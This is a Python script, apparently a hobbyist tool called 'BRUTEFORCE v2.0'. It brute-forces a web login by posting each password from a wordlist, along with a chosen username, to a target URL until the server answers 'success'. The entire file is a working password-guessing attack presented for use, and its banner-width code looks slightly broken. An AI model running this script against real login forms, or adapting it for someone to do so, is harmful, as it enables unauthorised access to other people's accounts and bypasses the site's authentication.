from colorama import Fore, init
import requests, os
init(autoreset=True)

def main(url: str, username):
    with open("./wordlist.txt", 'r') as file:
        lines = file.readlines()
        lens = 0
        for line in lines:
            lens = len(line.strip())
            print(f"{Fore.GREEN}[PASSWORD] {line.strip():<{lens}}\r", end='')
            response = requests.post(url, {
                'login': 'btn-button',
                'user': username,
                'password': line.strip()
            }, allow_redirects=False)
            if response.text == 'success':
                print(f"{Fore.LIGHTCYAN_EX}Password Cracked Successfully\n\n[TARGET] {url}\n[USERNAME] {username}\n[PASSWORD] {line.strip()}")
                break
        else:
            print(f"\n{Fore.LIGHTRED_EX}Sorry, seems like the correct password is not in the wordlist")
if __name__ == '__main__':
    TITLE = "WELCOME TO BRUTEFORCE v2.0 (SACHIN ACHARYA)"
    WIDTH = (os.get_terminal_size().columns / 2) - len(TITLE) / 2
    print("\n")
    print(f"{Fore.LIGHTBLUE_EX}{' ':<{WIDTH}}{TITLE}\n\n")
    while True:
        print(f"{Fore.LIGHTCYAN_EX}What is the target url?")
        main(input(), input("Username? "))
        
        if input("Done? ").lower() in ['y', 'yes']:
            break